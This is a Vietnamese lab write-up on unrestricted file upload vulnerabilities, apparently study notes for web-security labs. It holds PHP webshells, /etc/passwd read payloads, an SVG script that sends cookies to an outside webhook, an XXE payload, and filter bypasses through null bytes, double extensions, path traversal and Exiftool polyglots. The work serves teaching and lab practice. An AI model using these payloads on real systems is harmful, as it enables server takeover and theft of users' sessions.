<img width="837" height="376" alt="image" src="https://github.com/user-attachments/assets/ecb87cc9-b108-4369-9a6c-e3f9186216bd" />

# Lỗ hổng Unrestricted File Upload
## 1. Đĩnh nghĩa
\- Đây là lỗi xuất phát từ phía Server

\- Là lỗ hổng xảy ra khi một ứng dụng web cho phép người dùng tải file lên hệ thống nhưng không xác thực chặt chẽ các tiêu chí của file như tên, định dạng (type), nội dung hoặc kích thước

## 2.Nguyên nhân, vị trí lỗi
\- Nguyên nhân gốc rễ: 
- Lỗ hổng bắt nguồn từ việc hệ thống quá tin tưởng vào dữ liệu đầu vào do người dùng cung cấp
- Máy chủ thiếu các cơ chế kiểm duyệt và rào chắn an toàn ở tầng backend đối với file được tải lên. Việc chỉ kiểm tra định dạng file ở phía client là không đủ vì kẻ tấn công có thể dễ dàng can thiệp và thay đổi request trước khi gửi đi

\- Vị trí lỗi: 
- Hệ thống lưu file trực tiếp vào filesystem và cấp quyền truy cập (read/execute) thông qua URL/CDN tạo điều kiện cho RCE
- Lỗi không chỉ nằm ở code application mà còn ở cấu hình máy chủ. Server được cấu hình cho phép thực thi các script (PHP, ASPX, JSP...) ngay trong thư mục chứa file upload

## 3.Hậu quả, tác hại
### a. Remote Code Execution 

\- Đây là hậu quả nghiêm trọng nhất. Nếu bạn upload thành công một webshell và server thực thi nó, ta có thể thao tác, truy xuất bất kì dữ liệu nào của web

\- Cơ chế: Tải lên các script như .php, .aspx, .jsp chứa mã độc, ví dụ:

```
<?php system($_REQUEST['cmd']); ?>

<?php echo file_get_contents('/etc/passwd'); ?>
```

\- **Hậu quả:** 
- Ta có thể thao tác, truy xuất bất kì dữ liệu nào của website
- Kiểm soát hoàn toàn: Thực thi lệnh hệ thống dưới quyền của user đang chạy web server

&rarr; Làm bàn đạp (pivot) dẫn đến leo thang đặc quyền: Từ user web, kẻ tấn công tìm lỗ hổng trong OS để chiếm quyền root/admin

### 2. Cross-Site Scripting & XML External Entity 
\-  File Upload là một con đường cực kỳ nhanh và tinh vi để thực hiện Stored XSS và XXE mà ít khi server validate (do thường chú tâm hơn đến các file thực thi webshell khác)

Cơ chế: Tải lên file .html hoặc .svg có chứa mã JavaScript
```
<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('https://webhook.com/log?c='+btoa(document.cookie))</script></svg>

<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>

<img src=x onerror=alert(document.origin)>
```

\- **Hậu quả:** 
- Đánh cắp cookie, session token của người dùng để đăng nhập trái phép

- Phát tán mã độc: Chỉnh sửa nội dung trang web hiển thị với nạn nhân để thực hiện phishing, keylogging

### 3. Denial of Service (DoS) 

\- Tấn công vào tài nguyên phần cứng của server khiến dịch vụ không thể phục vụ người dùng hợp lệ

\- Cơ chế: Upload liên tục các file có dung lượng cực lớn để làm đầy ổ cứng, cạn kiệt tài nguyên
- Image Bomb (Pixel Flood): Upload một bức ảnh có kích thước pixel khổng lồ nhưng dung lượng nén nhỏ. Khi server cố gắng giải nén ảnh để xử lý (tạo thumbnail), nó sẽ ngốn sạch RAM và CPU, gây treo máy
- Ghi đè file hệ thống: Nếu server có lỗi Path Traversal, kẻ tấn công có thể upload file đè lên các file cấu hình quan trọng, khiến ứng dụng ngừng hoạt động

## 4. Các dạng filter thường gặp và cách bypass
### 4.1 Kiểm duyệt file extension
\- Server hay các cơ chế 
- Blacklist, từ chối các đuôi file như .php, .phtml, .php5, .pht...
- Whitelist, chỉ cho phép đuôi file nhất định như .png, .jpg,... mới có thể thực hiện tải file

\- Bypass:
- Sử dụng obfuscate file extension: `shell.jpg.php`, `shell.php.jpg`
- Null bytes: `shell.php%00.jpg`, `shell.phtml%00.png`
- Bất đồng bộ giữa bộ lọc kiểm duyệt và cách webserver xử lý file: `shell.php.`, `shell.php  .`, `shell.aspx;.png`

### 4.2 Kiểm duyệt Metadata và nội dung
#### Kiểm duyệt MIME Type (Content-Type header)
\- Nếu hệ thống quá tin tưởng vào Header do phía client gửi lên, nó có thể bị sửa đổi mà không phản ánh đúng bản chất thực sự của file

\- Gửi request với Content-Type như `text/html` hoặc `application/svg+xml` &rarr; HTML Injection

#### Kiểm duyệt File Signature 
\- Lỗ hổng: Nếu server chỉ kiểm tra vài byte đầu mà không quét toàn bộ nội dung, kẻ tấn công có thể chèn mã độc vào phía sau các byte "hợp lệ" đó

\- Cơ chế: Server đọc magic bytes của file để xác định định dạng thực tế, ví dụ: 
- File JPEG luôn bắt đầu bằng `FF D8 FF`
- File PNG là `89 50 4E 47`
- File GIF là `GIF89a` (rất hay sử dụng để bypass filter)

#### Cách khai thác
\- Tạo một polygot (một file chứa nhiều định dạng) PHP-JPG bằng Exiftool

\- Nếu server thực thi phần mã chứa trong metadata của ảnh &rarr; RCE

$\implies$ Bypass được cả kiểm duyệt filename, file extension, Magic Bytes và Content-check
  - Phụ thuộc vào cấu hình của server khi cho phép xử lí ảnh như một script

### 4.3. Kiểm duyệt Logic và Cấu trúc file
#### Kiểm tra kích thước:

\- Cơ chế: Giới hạn dung lượng tối đa của file tải lên để tránh tràn bộ nhớ ổ cứng, nhưng cũng đủ dung lượng nhất định để xác định đây là file thật

\- Lỗ hổng: Thiếu giới hạn này dẫn đến tấn công DoS (làm cạn kiệt tài nguyên)

#### Kiểm tra thông số kỹ thuật (Image Dimensions):

\- Cơ chế: Sử dụng các thư viện xử lý ảnh để kiểm tra chiều rộng/cao của ảnh

\- Lỗ hổng: Lỗ hổng nằm ở chính các thư viện xử lý ảnh (như ImageMagick). Khi server cố gắng "đọc" thông số ảnh, nếu thư viện đó dính lỗi (như XXE hay RCE), server sẽ bị chiếm quyền điều khiển ngay lập tức

### 4.4 Kiểm duyệt tên file (Filename Sanitization)
\- Cơ chế: Lọc bỏ các ký tự đặc biệt (/, \, .., \0) để đảm bảo file được lưu đúng thư mục, đúng định dạng quy định

\- Lỗ hổng: Thiếu bước này dẫn đến Path Traversal, cho phép file bị đẩy vào các vị trí nhạy cảm có thể thực thi script hoặc ghi đè lên các file cấu hình quan trọng của hệ thống

\- Bypass: Tận dụng kĩ thuật bypass Path Traversal
- `%2f` &rarr; `/`
- `....//` &rarr; `../`

### 4.5 Các loại filter/ lỗ hổng khác
#### Lưu tạm file trên hệ thống trước khi validate
\- Cơ chế: Lưu file vào mục tạm hoặc lưu trực tiếp trên hệ thống trong 1 khoảng thời gian, đưa vào các hàm để check file có an toàn hay không 

\- Cách này tạo khoảng trống cho Race condition (Lab cuối), chỉ một tích tắc file tồn tại trên web cũng có thể dẫn đến lỗ hổng nghiêm trọng

\- Bypass: 
- Cần trích xuất được source code để xem mục mà file được lưu "tạm" trong vài giây
- Turbo Intruder

#### Lỗ hổng tải file bằng method PUT
\- Server cấu hình sai, cho phép HTTP PUT nhưng thiếu xác thực hoặc phân quyền đối với các hệ thống thư mục

\- Quản trị viên đã vô tình để mở quyền 4 cho phép các phương thức HTTP nguy hiểm tác động vào filesystem, ví dụ:
```
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```





# Lab 01

<img width="1059" height="408" alt="image" src="https://github.com/user-attachments/assets/f9926029-18bc-4ccc-98a3-bd5e5f18ba9d" />

\- Với mô tả và đề bài như trên, ứng dụng cho phép upload file mà không hề có validation → có thể upload file PHP độc hại

***Cách 1:*** Sử dụng hàm `file_get_contents` nhằm trích xuất trực tiếp nội dung file:

\- Tại chức năng tải ảnh đại diện, thực hiện upload một file bất kì vào

\- Sửa extension thành `.php`, `.phtml`, ... với nội dung file:

```
<?php
echo file_get_contents('/home/carlos/secret');
?>
```
\- Gửi file lên một lần nữa, quay trở về trang trước đó, Burp đã bắt được gói tin để load ảnh đại diện

  <img width="1565" height="293" alt="image" src="https://github.com/user-attachments/assets/547e0a64-fe11-4a12-b19c-381d7e277150" />

***Cách 2:*** Sử dụng lệnh thực thi PHP, RCE thông qua một biến do ta kiểm soát

\- Thực hiện tải ảnh, sửa extension với nội dung file:
```
<?php
system($_REQUEST['cmd']);
?>
```

\- Truy cập endpoint mà server tải ảnh lên và lấy secret

<img width="1605" height="171" alt="image" src="https://github.com/user-attachments/assets/39ddf973-36a7-45b3-93f1-196cea3ec059" />

# Lab 02
<img width="1048" height="462" alt="image" src="https://github.com/user-attachments/assets/e74f8a35-1144-402f-b468-b63da24f15c5" />

\- Sau khi tải trực tiếp một file với extension `.php` thì lập tức trả về
```
Sorry, file type application/octet-stream is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.
```
- Khi kiểm tra Content-Type của request, ta nhận được giá trị `application/octet-stream`

\- Sửa Content-Type của request thành `image/png` hoặc `image/jpeg`

\- Sửa nội dung của request:

```
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

\- Back về trang ban đầu, đọc request tải ảnh từ server, ta có được secret:
<img width="1528" height="271" alt="image" src="https://github.com/user-attachments/assets/ac32103a-394e-44a6-8224-bcb04b3f611a" />

# Lab 03
<img width="1043" height="407" alt="image" src="https://github.com/user-attachments/assets/bfa4e50e-8461-4af5-865f-83fad8a18500" />

\- Thực hiện tải webshell với body chứa hàm thực thi `system()`

\- Khi quay lại trang trước đó, ta nhận thấy request tải ảnh đại diện không thực thi, chỉ trả ra plaintext:
<img width="1498" height="265" alt="image" src="https://github.com/user-attachments/assets/d4981f77-ce34-4af4-8637-cebd8abc304f" />
- Chứng tỏ, endpoint này không thực thi lệnh PHP

\- Dựa vào mô tả của lab, ta sẽ đặt biến `filename="../a.php"` nhằm thoát khỏi thư mục upload mặc định, ghi webshell vào nơi có thể thực thi PHP
- Nhận trên thông báo "The file avatars/abc.php has been uploaded."
- Nếu ta tải webshell với `filename` như trên, file thực thi sẽ nằm ở `/files/avatars/../abc.php` = `/files/abc.php`

\- Khi truy cập endpoint `/files/abc.php`, website trả ra lỗi 404, chứng tỏ file không hề được tải lên. Thử với `/avatars/abc.php` cũng không thành công
- Có vẻ như lab đã thêm một lớp filter không cho phép `../` trong tên file

\- Thực hiện URL decode dấu slash &rarr; %2f &rarr; `filename=..%2fabc.php`
- Nhận được thông báo "The file avatars/../abc.php has been uploaded.", chứng tỏ đã khai thác thành công

\- Vào lại endpoint `/files/abc.php` và nhận kết quả
> wn62nn8plod9I4cToSsLAmcWjnFEVc13

# Lab 05
<img width="1044" height="399" alt="image" src="https://github.com/user-attachments/assets/0367485a-e82a-46c2-bcaa-977724b4b5fc" />

\- Mô tả của lab là làm rối file extension, nhưng ta vẫn nên check một lượt các extension có thể thực thi webshell:

<img width="774" height="618" alt="image" src="https://github.com/user-attachments/assets/31d5d8d7-06fe-4772-bf64-9b5e6a20eaa3" />
- Rõ ràng server đã whitelist extension, dường như chỉ cho phép `.png`, `.jpeg`, `.jpg` được pháp tải lên

\- Đến đây, thực hiện obfuscate file extension: `.php.png` và thành công bypass bộ lọc, tải được webshell

\- Nhưng truy cập vào request tải ảnh, code PHP hiện lên ở dạng plaintext &rarr; code không được server thực thi
- Ta thử đảo ngược extensions `.png.php` thì bị từ chối thẳng thừng
- Thử `.pHp`, `.PhP` cũng không thành công
- Semicolon character: `.php%3B.jpg` &rarr; ❌

\- Việc code không thực thi có thể là do file extension là file ảnh, ta cần làm cách nào để qua bypass bằng cách
- Có extension hợp lệ `.jpg`, `.png`
- Nhưng khi server tải ảnh thì thực thi PHP

$\implies$ Null-bytes (`%00` &rarr; `\x00`) 
- Nhằm cắt chuỗi xử lí ở level thấp

\- Với `filename="a.php%00.jpg"`, ta nhận được "The file avatars/a.php has been uploaded." &rarr; bypass thành công

\- Truy cập `/files/avatars/a.php` và thực hiện RCE:

<img width="1606" height="165" alt="image" src="https://github.com/user-attachments/assets/6ca60d34-b424-4237-877e-06896af02a9c" />


***LOGIC BACKEND***

\- Kiểm tra: `a.php%00.jpg` → thấy `.jpg` → cho qua

\- Xử lý: `a.php\0.jpg` → bị cắt thành `a.php`

# Lab 06

<img width="1039" height="454" alt="image" src="https://github.com/user-attachments/assets/0b9e04c8-b8f6-41a4-bab3-fee64cddee5f" />

\- Backend kiểm tra đây có phải file ảnh thật hay không bằng cách:
- Xem các bytes đầu của ảnh
- Xem các bytes cuối của ảnh
- Kiểm tra kích thước của ảnh

***CÁCH 1***

\- Sử dụng magic bytes của file ảnh GIF, rất hay được sử dụng để khai thác dạng bài này: `GIF89a`

\- Tên file vẫn là `.php`, với nội dung file:
```
GIF89a

<?php
system($_REQUEST['cmd']);
?>
```

\- Truy cập vào request dùng để fetch tài nguyên từ server, thực hiện RCE: 

<img width="1542" height="344" alt="image" src="https://github.com/user-attachments/assets/0ff418bc-b7a9-4fd6-bb90-1fc67c8fa945" />

***CÁCH 2***

\- Khi đọc docs về cách khai thác dạng bài này, ta còn một cách là sử dụng Exiftool để cho payload vào trong ảnh khá là hay
- Dùng để đọc / chỉnh sửa metadata của file (đặc biệt là ảnh)

\- Cài đặt:

```
$ sudo apt update
$ sudo apt install libimage-exiftool-perl
```

\- Từ đây, ta tạo một polyglot file (1 file có nhiều định dạng cùng lúc)
```
exiftool -Comment="<?php system($_REQUEST['cmd']); ?>" abc.jpg
```
<img width="772" height="532" alt="image" src="https://github.com/user-attachments/assets/a7b2c49e-19ac-4dc7-9452-404d774fd2a2" />

\- Upload ảnh lên web, chuyển extension thành `.php`, khi này server sẽ in binary rác ra trước, rồi thực thi code qua biến `cmd`

<img width="794" height="175" alt="image" src="https://github.com/user-attachments/assets/62da3c1f-3013-44b3-b6fa-03cbecf12635" />

- Vì binary rác quá nhiều, ta cần đánh dấu secret kẹp giữa "START" và "END" để tường minh hơn


# Lab 07
<img width="1059" height="432" alt="image" src="https://github.com/user-attachments/assets/c61eb955-3f4e-43d8-a6ff-ad95315c49b1" />


<details>
  
  <summary>Hint</summary> 
 
```
  <?php
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];

// temporary move
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
} else {
    unlink($target_file);
    echo "Sorry, there was an error uploading your file.";
    http_response_code(403);
}

function checkViruses($fileName) {
    // checking for viruses
    ...
}

function checkFileType($fileName) {
    $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
    if($imageFileType != "jpg" && $imageFileType != "png") {
        echo "Sorry, only JPG & PNG files are allowed\n";
        return false;
    } else {
        return true;
    }
}
?>
```
  
</details>

 









